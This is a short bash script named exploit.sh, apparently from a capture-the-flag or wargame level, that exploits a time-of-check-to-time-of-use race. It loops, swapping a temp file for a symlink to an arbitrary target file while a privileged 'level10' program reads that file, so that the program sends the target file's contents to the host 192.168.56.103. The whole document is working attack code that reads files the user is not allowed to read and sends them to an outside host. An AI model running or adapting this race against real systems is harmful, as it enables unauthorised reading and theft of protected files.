#!/bin/bash
# exploit.sh

TEMPFILE="/var/tmp/exploit"
OLD_LS=`ls -l $1`
NEW_LS=`ls -l $1`

while [ "$OLD_LS" == "$NEW_LS" ]
do
  rm -f $TEMPFILE
  echo "From user: " > $TEMPFILE
  echo "TOCTOU success" | /home/user/level10/level10 $TEMPFILE 192.168.56.103 & unlink $TEMPFILE
  ln -s $1 $TEMPFILE & NEW_LS=`ls -l $1`
done
